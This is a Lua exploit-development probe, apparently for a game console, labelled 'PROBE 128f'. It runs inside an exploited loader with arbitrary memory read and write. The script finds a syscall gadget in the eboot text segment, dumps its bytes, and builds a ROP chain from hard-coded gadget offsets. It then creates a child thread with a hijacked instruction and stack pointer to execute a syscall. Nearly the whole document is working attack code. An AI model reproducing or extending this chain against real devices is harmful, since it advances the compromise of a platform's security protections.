-- CRASH_CLASS: LOW
-- PROBE 128f: Identify syscall.syscall_address (sa)
--
-- 128d proved child threads CAN make syscalls via sa. 200 UMTX ops looped
-- cleanly in section A. This probe:
-- 1. Prints sa address and checks if it's in eboot (RX, readable)
-- 2. If readable, dumps 32 bytes at sa to identify the dispatch pattern
-- 3. Confirms child syscall capability with getpid(20) via ROP + sa
-- 4. Reads 8 bytes at sa+2 (post-syscall continuation) to find the ret
--
-- NO dangerous operations. Just identification.

print("=== PROBE 128f: SYSCALL_ADDRESS IDENTITY ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function fmt(v)
    if v == nil then return "nil" end
    local h, l
    if type(v) == "table" and v.h then h, l = v.h, v.l
    else h, l = 0, N(v) end
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end
    return string.format("0x%08X%08X", h, l)
end

local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid end

-- [A] Addresses
print("")
print("[A] Address discovery")

local sa = syscall.syscall_address
local sa_hi, sa_lo
if type(sa) == "table" and sa.h then sa_hi, sa_lo = sa.h, sa.l
else sa_hi, sa_lo = 0, N(sa) end
if sa_hi < 0 then sa_hi = sa_hi + 0x100000000 end
if sa_lo < 0 then sa_lo = sa_lo + 0x100000000 end
print(string.format("  syscall_address = 0x%X%08X", sa_hi, sa_lo))

local info = memory.alloc(0x200)
wd(N(info), 0x160)
pcall(function() mk(593)(uint64(0), info) end)
local text_lo = rd(N(info) + 0x108) or 0
local text_hi = rd(N(info) + 0x10C) or 0
if text_lo < 0 then text_lo = text_lo + 0x100000000 end
if text_hi < 0 then text_hi = text_hi + 0x100000000 end
local text_sz_lo = rd(N(info) + 0x110) or 0
local text_sz_hi = rd(N(info) + 0x114) or 0
if text_sz_lo < 0 then text_sz_lo = text_sz_lo + 0x100000000 end
if text_sz_hi < 0 then text_sz_hi = text_sz_hi + 0x100000000 end
print(string.format("  eboot text = 0x%X%08X  size=0x%X%08X", text_hi, text_lo, text_sz_hi, text_sz_lo))

local function eaddr(off)
    return uint64(string.format("0x%X%08X", text_hi, text_lo + off))
end

-- Check sa vs eboot range
local in_eboot = false
local sa_offset = nil
if sa_hi == text_hi then
    local diff = sa_lo - text_lo
    if diff >= 0 and diff < 0x600000 then
        in_eboot = true
        sa_offset = diff
    end
end

if in_eboot then
    print(string.format("  sa is eboot+0x%X → RX, READABLE", sa_offset))
else
    print(string.format("  sa is NOT in eboot range"))
    -- Check 674 map to see what region sa is in
    local sc_674 = mk(674)
    local qbuf = memory.alloc(0x80)
    wd(N(qbuf), sa_lo)
    wd(N(qbuf) + 4, sa_hi)
    local qr = nil
    pcall(function()
        qr = sc_674(qbuf, uint64(0x48), uint64(0), uint64(0), uint64(0), uint64(0))
    end)
    if qr and N(qr) >= 0 then
        local prot = rd(N(qbuf) + 0x18) or 0
        print(string.format("  674 says: prot=0x%X", prot))
        if prot == 5 then
            in_eboot = true
            print("  prot=5 = RX, safe to read")
        elseif prot == 4 or prot == 1 then
            print("  prot=" .. prot .. " = XO, DO NOT READ")
        elseif prot == 3 then
            print("  prot=3 = RW, readable (data segment?)")
        end
    end
end

if not alive() then print("DIED in A!") return end

-- [B] Byte dump at sa (only if safe)
print("")
print("[B] Byte dump at sa")

if in_eboot then
    local sa_addr = N(sa)
    for row = 0, 1 do
        local line = string.format("  +%02X: ", row * 16)
        for col = 0, 15 do
            local off = row * 16 + col
            local d = rd(sa_addr + off)
            if d then
                line = line .. string.format("%02X ", d % 256)
            else
                line = line .. "?? "
            end
        end
        print(line)
    end

    -- Decode: is it syscall (0F 05)?
    local d0 = rd(sa_addr) or 0
    if d0 < 0 then d0 = d0 + 0x100000000 end
    local b0 = d0 % 256
    local b1 = math.floor(d0 / 256) % 256
    if b0 == 0x0F and b1 == 0x05 then
        print("  → CONFIRMED: 0F 05 = syscall at sa")
        local b2 = math.floor(d0 / 65536) % 256
        local b3 = math.floor(d0 / 16777216) % 256
        if b2 == 0xC3 then
            print("  → syscall; ret — perfect gadget!")
        elseif b2 == 0x48 then
            print("  → syscall; REX prefix — likely mov/push, then ret")
        elseif b2 == 0xEB or b2 == 0xE9 then
            print("  → syscall; jmp — trampoline pattern")
        else
            print(string.format("  → continuation byte: 0x%02X", b2))
        end
    elseif b0 == 0xC3 then
        print("  → sa starts with ret! (wrapper returned)")
    else
        print(string.format("  → sa starts with %02X %02X (not syscall)", b0, b1))
    end
else
    print("  SKIPPED: sa not confirmed readable (XO risk)")
end

if not alive() then print("DIED in B!") return end

-- [C] Child thread syscall test: getpid(20) via ROP + sa
print("")
print("[C] Child syscall test: getpid via ROP + sa")
collectgarbage("stop")

local G = {
    ret     = 0x42,
    pop_rax = 0x992,
    pop_rsp = 0x9A2,
    pop_rdi = 0xC9DFE,
    mov_w   = 0x92C67,
    jmp_loop = 0x15481,
}

local shared = memory.alloc(0x100)
local RESULT = N(shared)
local SENTINEL = N(shared) + 8
wq(RESULT, uint64("0xDEADDEADDEADDEAD"))
wq(SENTINEL, uint64("0x0"))

local stk = memory.alloc(0x8000)
local CB = N(stk) + 0x4000

-- Chain: getpid(20) → store result → spin
-- rax = 20 (getpid), sa → syscall, rax = pid
-- store: rdi = &RESULT, [rdi] = rax
wq(CB + 0x00, eaddr(G.pop_rax))
wq(CB + 0x08, uint64(20))              -- getpid
wq(CB + 0x10, sa)                      -- syscall!

-- After syscall, rax = child's pid (should match main pid — same process)
-- Store rax to RESULT
wq(CB + 0x18, eaddr(G.pop_rdi))
wq(CB + 0x20, uint64(string.format("0x%X", RESULT)))
wq(CB + 0x28, eaddr(G.mov_w))          -- mov [rdi], rax; ret

-- Write sentinel
wq(CB + 0x30, eaddr(G.pop_rdi))
wq(CB + 0x38, uint64(string.format("0x%X", SENTINEL)))
wq(CB + 0x40, eaddr(G.pop_rax))
wq(CB + 0x48, uint64("0xAAAAAAAAAAAAAAAA"))
wq(CB + 0x50, eaddr(G.mov_w))

-- Spin (jmp $)
wq(CB + 0x58, eaddr(G.jmp_loop))

local ctx = memory.alloc(0x500)
local tid_buf = memory.alloc(8)
local BC = N(ctx)

for off = 0, 0x4BC, 4 do wd(BC + off, 0) end
wd(BC + 0x108, 0x480)
wd(BC + 0xD0, 0)
wd(BC + 0x110, 0x10000)
wd(BC + 0xC0, 0x43)
wd(BC + 0x100, 0x3B)
local rip_lo = (text_lo + G.ret) % 0x100000000
local rip_hi = text_hi + math.floor((text_lo + G.ret) / 0x100000000)
wd(BC + 0xE0, rip_lo)
wd(BC + 0xE4, rip_hi)
local rsp_lo = CB % 0x100000000
local rsp_hi = math.floor(CB / 0x100000000)
wd(BC + 0xF8, rsp_lo)
wd(BC + 0xFC, rsp_hi)

wq(N(tid_buf), uint64("0x0"))
local tr = nil
pcall(function() tr = mk(430)(ctx, tid_buf, uint64(0)) end)
local child_tid = rq(N(tid_buf))
print(string.format("  thr_create ret=%s tid=%s", fmt(tr), fmt(child_tid)))

if tr == nil or N(tr) ~= 0 then
    print("  THREAD CREATION FAILED!")
else
    -- Wait for child
    for i = 1, 200 do native.fcall_with_rax(stub, 20) end

    local sent = rq(SENTINEL)
    local result = rq(N(shared))
    print(string.format("  sentinel=%s", fmt(sent)))
    print(string.format("  child_getpid=%s  main_pid=%d", fmt(result), pid))

    if sent and N(sent) ~= 0 then
        local child_pid = N(result)
        if child_pid == pid then
            print("  *** CONFIRMED: child getpid == main pid ***")
            print("  *** CHILD THREADS CAN MAKE SYSCALLS VIA sa ***")
        elseif child_pid > 0 and child_pid < 1000000 then
            print(string.format("  child pid=%d, main pid=%d — DIFFERENT?", child_pid, pid))
        else
            print("  result looks wrong — may not be pid")
        end
    else
        print("  child did not reach sentinel")
    end
end

if not alive() then print("DIED in C!") return end

-- [D] Also check: what other loader properties are available?
print("")
print("[D] Loader syscall pipe properties")
local props = {"fn_addr", "syscall_address", "ropchain", "fcall_stub"}
for _, name in ipairs(props) do
    local ok, val = pcall(function() return syscall.pipe[name] end)
    if ok and val ~= nil then
        print(string.format("  pipe.%s = %s", name, fmt(val)))
    else
        local ok2, val2 = pcall(function() return syscall[name] end)
        if ok2 and val2 ~= nil then
            print(string.format("  syscall.%s = %s", name, fmt(val2)))
        end
    end
end

-- Check tostring for any extra info
local pipe_str = tostring(syscall.pipe)
print("  pipe_str: " .. (pipe_str or "nil"))

print("")
print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 128f COMPLETE ===")
